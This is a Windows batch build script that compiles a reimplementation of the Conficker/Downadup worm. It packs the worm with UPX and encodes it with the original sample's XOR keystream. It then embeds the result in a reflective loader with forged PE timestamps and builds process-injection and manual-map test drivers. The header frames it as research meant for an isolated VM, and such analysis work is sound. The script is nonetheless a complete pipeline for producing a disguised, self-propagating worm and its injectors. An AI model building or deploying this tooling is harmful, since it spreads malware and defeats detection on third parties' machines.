@echo off
REM =====================================================================
REM  build.bat - KIDO (Conficker/Downadup A) reproduction, Visual C++ 2022 (x86)
REM
REM  Reproduces the 3-layer kido.sample exactly, as far as a reimplementation
REM  of the original code can:
REM
REM    build\kido_worm.dll      STAGE 3 - the worm (stage-3 reimplementation)
REM    build\kido_stage2.dll    STAGE 2 - the worm UPX -9 packed (UPX 5.x, NRV2B)
REM    build\kido_stage1.dll    STAGE 1 - reflective loader/crypter. Embeds
REM                             stage-2 encoded with the EXACT original
REM                             position-dependent XOR keystream (recovered from
REM                             kido.sample); decodes it, maps it by hand, and
REM                             calls its entry point.  PE identity matches the
REM                             original: PE32 i386, ImageBase 0x10000000,
REM                             GUI subsystem, build timestamp 0x39DF5AFB.
REM    build\test_crypto.exe    self-test of the worm crypto primitives
REM    build\decode_test.exe    proves the embedded stage-2 decodes bit-exact
REM    build\load_test.exe      LoadLibrary chain driver          (run on VM)
REM    build\inject_test.exe    manual-map + direct-EP driver     (run on VM)
REM    build\inject2_test.exe   clean-process injector driver     (run on VM)
REM    build\worm_load.exe      direct worm DllMain driver        (run on VM)
REM
REM  Size-optimised, PDB-free, debug-info stripped:
REM    /O2 /Oy- /GF /Gy, /MD dynamic CRT (the original worm dynamically
REM    linked its CRT too - MSVCRT.dll in its import table), /OPT:REF /ICF,
REM    /DEBUG:NONE.  /MD is REQUIRED: a static-CRT (/MT) build balloons to
REM    ~167 KB and packs to ~80 KB, no longer fitting the 42,496-byte
REM    stage-1 .data embedding layout.
REM
REM  This script only BUILDS - it never executes the sample or the repro
REM  (the test drivers are meant to be run on the isolated analysis VM).
REM =====================================================================
setlocal
set ROOT=%~dp0
cd /d "%ROOT%"

set "VSCMD=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
if not exist "%VSCMD%" set "VSCMD=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat"
if not exist "%VSCMD%" (
  echo [ERROR] Could not find vcvarsall.bat for VS 2022. 1>&2
  exit /b 1
)
call "%VSCMD%" x86 >nul

set "UPXPAT=C:\Tools\upx.exe"
if not exist "%UPXPAT%" (
  where upx >nul 2>nul
  if errorlevel 1 ( echo [ERROR] upx.exe not found 1>&2 & exit /b 1 )
  set "UPXPAT=upx"
)

if not exist build\obj mkdir build\obj

set CLFLAGS=/nologo /c /W3 /O2 /Oy- /GF /Gy /MD /DWIN32 /D_WINDOWS /DNDEBUG /D_CRT_SECURE_NO_WARNINGS
set LDFLAGS=/nologo /MACHINE:X86 /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /DEBUG:NONE

echo == [1/5] compile worm (stage 3) ==
cl %CLFLAGS% /Fobuild\obj\\ src\worm\crypto.cpp src\worm\kido_global.cpp src\worm\kido_guards.cpp ^
  src\worm\kido_main.cpp src\worm\kido_install.cpp src\worm\kido_http.cpp ^
  src\worm\kido_net.cpp src\worm\kido_geo.cpp src\worm\kido_downloader.cpp
if errorlevel 1 ( echo [ERROR] worm compile failed 1>&2 & exit /b 1 )

echo == [2/5] link worm DLL (stage 3, base 0x10000000) ==
link.exe %LDFLAGS% /DLL /BASE:0x10000000 /OUT:build\kido_worm.dll ^
  build\obj\crypto.obj build\obj\kido_global.obj build\obj\kido_guards.obj ^
  build\obj\kido_main.obj build\obj\kido_install.obj build\obj\kido_http.obj ^
  build\obj\kido_net.obj build\obj\kido_geo.obj build\obj\kido_downloader.obj ^
  ws2_32.lib wininet.lib urlmon.lib ole32.lib oleaut32.lib version.lib advapi32.lib iphlpapi.lib user32.lib shell32.lib
if errorlevel 1 ( echo [ERROR] worm link failed 1>&2 & exit /b 1 )
python tools\patch_timestamp.py build\kido_worm.dll 0x3F73A4C6

echo == [3/5] UPX -9 pack worm -> stage 2 ==
copy /y build\kido_worm.dll build\kido_stage2.dll >nul
"%UPXPAT%" -9 -q build\kido_stage2.dll
if errorlevel 1 ( echo [ERROR] upx pack failed 1>&2 & exit /b 1 )

echo == [4/5] encode stage 2 with the original keystream -> stage2_payload.h ==
python tools\gen_stage2_payload.py build\kido_stage2.dll src\wrapper\stage2_payload.h
if errorlevel 1 ( echo [ERROR] payload generation failed 1>&2 & exit /b 1 )

echo == [4b/5] link stage 1 (reflective loader, base 0x10000000) ==
cl %CLFLAGS% /Fobuild\obj\\ src\wrapper\loader.cpp
if errorlevel 1 ( echo [ERROR] stage1 compile failed 1>&2 & exit /b 1 )
link.exe %LDFLAGS% /DLL /BASE:0x10000000 /OUT:build\kido_stage1.dll ^
  build\obj\loader.obj
if errorlevel 1 ( echo [ERROR] stage1 link failed 1>&2 & exit /b 1 )
python tools\patch_timestamp.py build\kido_stage1.dll 0x39DF5AFB

echo == [5/5] test drivers (console, x86) ==
cl %CLFLAGS% /Isrc\worm /Isrc\wrapper /Fobuild\obj\\ src\test\test_crypto.cpp
if errorlevel 1 ( echo [ERROR] test_crypto compile failed 1>&2 & exit /b 1 )
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\test_crypto.exe build\obj\test_crypto.obj build\obj\crypto.obj advapi32.lib
if errorlevel 1 ( echo [ERROR] test_crypto link failed 1>&2 & exit /b 1 )

cl %CLFLAGS% /Isrc\wrapper /Fobuild\obj\\ src\test\decode_test.cpp
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\decode_test.exe build\obj\decode_test.obj advapi32.lib
cl %CLFLAGS% /Fobuild\obj\\ src\test\load_test.cpp
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\load_test.exe build\obj\load_test.obj iphlpapi.lib ws2_32.lib
cl %CLFLAGS% /Fobuild\obj\\ src\test\inject_test.cpp
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\inject_test.exe build\obj\inject_test.obj iphlpapi.lib ws2_32.lib
cl %CLFLAGS% /Fobuild\obj\\ src\test\inject2_test.cpp
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\inject2_test.exe build\obj\inject2_test.obj iphlpapi.lib ws2_32.lib
cl %CLFLAGS% /Fobuild\obj\\ src\test\worm_load.cpp
link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
  /OUT:build\worm_load.exe build\obj\worm_load.obj iphlpapi.lib ws2_32.lib
if errorlevel 1 ( echo [ERROR] test drivers failed 1>&2 & exit /b 1 )

echo == strip PDB / debug info ==
if exist build\*.pdb del /q build\*.pdb

echo.
echo == done ==
dir build\kido_stage1.dll build\kido_stage2.dll build\kido_worm.dll build\*.exe 2>nul
endlocal
exit /b 0
